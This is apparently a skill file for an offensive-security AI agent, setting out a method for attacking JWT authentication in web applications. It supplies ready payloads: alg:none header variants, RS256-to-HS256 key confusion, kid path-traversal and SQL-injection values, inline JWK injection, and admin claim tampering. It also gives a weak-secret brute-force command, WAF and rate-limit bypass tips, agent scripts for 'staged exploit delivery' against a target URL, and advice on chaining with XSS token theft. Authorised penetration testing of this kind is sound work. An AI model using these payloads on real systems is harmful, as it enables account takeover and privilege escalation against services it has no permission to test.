---
name: web-09-jwt
sequence: web-09
category: auth
domain: web
description: "JWT attack methodology for web applications: algorithm confusion (alg:none, RS256→HS256), kid injection, jku/x5u/jwk header tampering, token replay, session handling flaws, and cookie-based JWT storage attacks. Use when testing web JWT authentication. See skills/auth/auth-01-jwt/ for full depth."
wordlist_ref: "wordlists/web/web-66-jwt-attacks/"
---

# JWT — Web Offensive Methodology

## Quick Workflow

1. **Locate the token**: `Authorization: Bearer <token>`, cookies, POST bodies, URL params
2. **Decode and inspect**: `base64url_decode(header).base64url_decode(payload)` — check `alg`, `kid`, `jku`, `jwk`, `x5u` fields
3. **Test algorithm bypass**: `alg: none`, `RS256→HS256` confusion (sign with known public key)
4. **Exploit kid/jku/jwk**: SQLi/path traversal in `kid`, remote JWKS in `jku`, inline key in `jwk`
5. **Test validation gaps**: expired tokens, missing `aud`/`iss`, `sub` tampering

---

## Web-Specific Attack Surface

### Browser Storage

```javascript
// Check localStorage, sessionStorage, cookies for JWT
localStorage.getItem('token');
document.cookie;  // look for eyJ... pattern
```

### Cookie-Based JWT

```
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: access_token=eyJhbGciOiJSUzI1NiJ9...
```

**Risks**: HttpOnly flag missing → XSS can steal; SameSite not set → CSRF; no `__Host-` prefix → subdomain cookie clash.

### URL Parameter Leakage

```
https://target.com/callback?token=eyJ...
```

**Risks**: Referer header leaks to third-party resources; server logs capture; CDN cache logs.

---

## Algorithm Attacks

```json
// alg: none — try all case variants
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
```

```json
// RS256→HS256 confusion
// Sign with RSA public key as HMAC secret
{"alg":"HS256","typ":"JWT","kid":"expected-key"}
```

```json
// kid injection
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"' OR 1=1 --"}
```

```json
// JWK injection (inline attacker key)
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
```

---

## Claims Tampering

```json
// Common privilege escalation claims
{"sub":"admin"}
{"role":"admin"}
{"roles":["admin"]}
{"is_admin":true}
{"scope":"admin:*"}
{"tenant_id":"00000000-0000-0000-0000-000000000000"}
```

**For each claim:**
1. Decode token → read existing claims
2. Mutate the claim value (admin, elevated, superuser, etc.)
3. Re-encode (keep original signature or switch to alg:none)
4. Submit — if server doesn't re-verify authorization, claim tampering works

## Weak Secret Brute Force

```bash
# Use jwt_tool with the weak secrets wordlist
python3 jwt_tool.py <token> -C -d wordlists/web/web-66-jwt-attacks/payloads/jwt/weak_secrets.txt

# Common weak secrets to check manually:
secret, password, 123456, admin, key, jwt_secret, jwtSecret, JWT_SECRET
mySecret, secretKey, secret_key, your-256-bit-secret, super-secret
```

---



## Hacker Mindset

**JWT security is about the library, not the token.** The library decides whether to trust `alg: none`, whether to validate the signature, whether to check `exp`. Find the library version, find the CVE.

**The public key is a secret in RS256→HS256.** If you can get the application's public key (JWKS endpoint, source code), you can sign HS256 tokens with it. The server will accept them because the secret is the public key.

**Claims are not authorization.** Just because the JWT contains `"role": "admin"` doesn't mean the server enforces it. Change the claim and test.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates
- jwt_tool
- jwt.io


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

```bash
# Confirm — test alg:none, case variants
bash agents/invoke.confirm.sh https://target.com/api/auth param

# Parameters — find injectable JWT fields
bash agents/invoke.parameters.sh https://target.com/api/auth

# Payloads — staged exploit delivery
bash agents/invoke.payloads.sh https://target.com/api/auth param low
```

---

## Chaining

- **XSS + JWT**: steal token from localStorage → full account hijack
- **CSRF + JWT**: if JWT in auto-sent cookie, forge state-changing requests
- **Open redirect + JWT**: redirect_uri captures JWT in URL fragment

**For full methodology**, see `skills/auth/auth-01-jwt/SKILL.md` — includes RS/HS confusion, HMAC brute force, JWKS cache poisoning, mobile storage extraction, timing attacks, and DPoP.

---

## Key References

- jwt.io — token debugger
- jwt_tool — `python3 jwt_tool.py <token> -M all`
- CVE-2015-9235 (alg:none), CVE-2018-0114 (key confusion), CVE-2022-23529 (node-jsonwebtoken)
